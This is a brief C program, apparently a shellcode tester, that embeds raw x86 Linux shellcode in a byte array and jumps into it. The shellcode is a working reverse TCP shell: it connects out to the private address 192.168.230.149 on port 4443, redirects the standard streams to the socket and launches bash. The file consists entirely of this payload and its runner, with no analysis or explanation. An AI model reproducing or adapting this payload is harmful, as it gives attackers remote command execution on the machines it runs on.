#include<stdio.h>
#include<string.h>

char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x50\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc7\x52\x52\x68\xc0\xa8\xe6\x95\x66\x68\x11\x5b\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\x6a\x10\x56\x57\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xfb\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80";

int main(void)
{

	printf("shellcode length: %d\n",strlen(code));
	(*(void(*)()) code)();
}
